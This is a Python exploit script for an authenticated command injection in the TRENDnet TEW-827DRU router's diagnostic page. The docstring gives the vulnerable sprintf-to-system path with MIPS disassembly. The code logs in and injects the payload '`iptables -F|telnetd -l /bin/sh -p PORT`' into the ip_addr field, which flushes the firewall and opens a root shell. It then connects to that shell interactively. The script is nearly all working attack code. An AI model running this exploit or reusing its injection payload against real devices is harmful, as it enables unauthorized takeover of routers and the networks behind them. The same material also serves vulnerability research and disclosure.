#!/usr/bin/python3
"""
This script exercises an authenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect to
a reverse shell.

The vulnerability is a command injection when processing an error message to inform the user about failing to resolve
the provided IP address. The string:

"echo \"ping: %s Unable to resolve, check that the name is correct" > %s"

is passed to sprintf then system. The first %s is filled with the value in 'ip_addr' field, the second is the static string
/tmp/diagnostic.


LOAD:00439604                 addiu   $v0, (aEchoPingSUnabl - 0x4C0000)  # "echo \"ping: %s Unable to resolve, chec"...
LOAD:00439608                 addiu   $v1, $fp, 0x258+var_224
LOAD:0043960C                 move    $a0, $v1         # s
LOAD:00439610                 move    $a1, $v0         # format
LOAD:00439614                 lw      $a2, 0x258+cp($fp)
LOAD:00439618                 la      $v0, aTDelay     # "t_delay"
LOAD:0043961C                 nop
LOAD:00439620                 addiu   $a3, $v0, (aTmpDiagnostic - 0x4C0000)  # "/tmp/diagnostic"
LOAD:00439624                 la      $v0, sprintf
LOAD:00439628                 nop
LOAD:0043962C                 move    $t9, $v0
LOAD:00439630                 jalr    $t9 ; sprintf
LOAD:00439634                 nop
LOAD:00439638                 lw      $gp, 0x258+saved_gp($fp)
LOAD:0043963C                 b       loc_4397D8
LOAD:00439640                 nop
...
LOAD:004397D8                 addiu   $v0, $fp, 0x258+var_224
LOAD:004397DC                 move    $a0, $v0         # command
LOAD:004397E0                 la      $v0, system
LOAD:004397E4                 nop
LOAD:004397E8                 move    $t9, $v0
LOAD:004397EC                 jalr    $t9 ; system
LOAD:004397F0                 nop

The packet is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
import mow
import time
import base64
import requests
import argparse
import telnetlib


def telnet_connect(host, port):
    """
    Connect to a telnet server.

    :param host: Host the telnet server is running on.
    :type host: str

    :param port: Listening port of the telnet server.
    :type port: int

    :return: Open telnet session or None
    """
    try:
        return telnetlib.Telnet(host, port, 0.1)
    except:
        return None


def authenticate(host, port, username, password):
    """
    Create a session and authenticate with the target.

    :param host: Target IP address.
    :type host: str

    :param port: Port router is listening on.
    :type port: int

    :param username: Username for logging in.
    :type username: str

    :param password: Password for logging in.
    :type password: str

    :return: Open authenticated session to communicate with the router.
    :exception: Raised on failing to authenticate with the router.
    """
    username_b64 = base64.standard_b64encode(bytes(username, 'utf8'))
    password_b64 = base64.standard_b64encode(bytes(password, 'utf8'))

    data = {'html_response_page': '/login_pic.asp',
            'login_name': username_b64,
            'log_pass': password_b64,
            'action': 'do_graph_auth',
            'login_n': 'admin',
            'tmp_log_pass': '',
            'graph_code': '',
            'session_id': '12345'}

    request = requests.Session()
    response = request.post('http://%s:%d/apply_sec.cgi' % (host, port), data=data)
    if response.ok:
        return request
    raise Exception('Failed to authenticate to host.')


def exploit_target(host, port, telnet_port, username, password):
    """
    Send the exploit to the target and connect to the reverse shell.

    :param host: Target IP address.
    :type host: str

    :param port: Target port.
    :type port: int

    :param telnet_port: Telnet port to open on the target.
    :type telnet_port: int

    :param username: Username used for authentication.
    :type username: str

    :param password: Password used for authentication.
    :type password: str
    """

    # Drop firewall rules to allow connecting to the telnet server. '|' is used because ';' and '&' are dropped when
    # present in the header.
    telnet_command = b'`iptables -F|telnetd -l /bin/sh -p %d`' % telnet_port
    authenticate(host, port, username, password)

    data = {b'ccp_act': b'set',
            b'action': b'tools_diagnostic',
            b'method': b'0',
            b'ip_addr': telnet_command,
            b'pkt_size': b'64',
            b'cnt': b'4'}

    data = b'&'.join(b'%s=%s' % (key, value) for key, value in data.items())
    request = mow.CustomRequest(host, port, mow.POST, b'apply.cgi', data=data)
    packet = request.create_packet()
    mow.send_packet(host, port, packet)

    time.sleep(5)
    tn = telnet_connect(host, telnet_port)

    # If the exploit succeeded go interactive with the telnet session, otherwise report failure.
    if tn:
        tn.interact()
    else:
        print('Exploit failed, no telnet server listening at %s:%d' % (host, telnet_port))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Authenticated command injection exploit for TRENDNet TEW-827DRU.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)
    parser.add_argument('-t', '--tport', help='Telnet port to connect to on successful exploitation.', type=int,
                        default=5555)
    parser.add_argument('-u', '--user', help='Username to login with', required=True)
    parser.add_argument('-P', '--password', help='Password to login with', required=True)

    args = parser.parse_args()

    exploit_target(args.ip, args.port, args.tport, args.user, args.password)
